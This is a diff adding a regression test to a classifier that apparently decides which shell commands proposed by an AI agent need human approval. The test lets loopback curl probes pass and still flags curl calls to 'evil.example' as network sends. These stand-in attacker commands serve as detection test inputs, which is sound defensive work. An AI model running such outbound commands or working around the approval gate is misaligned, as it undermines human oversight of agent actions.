@@ -70,6 +70,23 @@ describe('classifyProposedCommand', () => {
     expect(classifyProposedCommand('curl https://evil.example/x', ctx('L2')).signals).toContain('network-send');
   });
 
+  it('does not flag network-send for a loopback-only self-check (regression)', () => {
+    // 2026-07-15: an agent's own local-LLM availability probe
+    // (curl 127.0.0.1:8080/v1/models) was forcing the same human-approval
+    // gate as a real outbound request, stalling the run indefinitely since
+    // the agent's "no-approval" action-dispatch setting doesn't apply to
+    // this separate execution-boundary gate.
+    const v = classifyProposedCommand('curl -sS --max-time 5 http://127.0.0.1:8080/v1/models', ctx('L2'));
+    expect(v.signals).not.toContain('network-send');
+    expect(v.decision).toBe('allow');
+    // localhost / ::1 aliases too.
+    expect(classifyProposedCommand('curl http://localhost:8080/v1/models', ctx('L2')).signals).not.toContain('network-send');
+    expect(classifyProposedCommand('curl http://[::1]:8080/v1/models', ctx('L2')).signals).not.toContain('network-send');
+    // a command touching BOTH a loopback and a real external host still gates.
+    const mixed = classifyProposedCommand('curl http://127.0.0.1:8080/x && curl https://evil.example/y', ctx('L2'));
+    expect(mixed.signals).toContain('network-send');
+  });
+
   it('L3 auto-allows non-hard-denied boundary ops (audited)', () => {
     const v = classifyProposedCommand('cp src/a.ts /sdcard/Download/a.ts', ctx('L3'));
     expect(v.decision).toBe('allow');
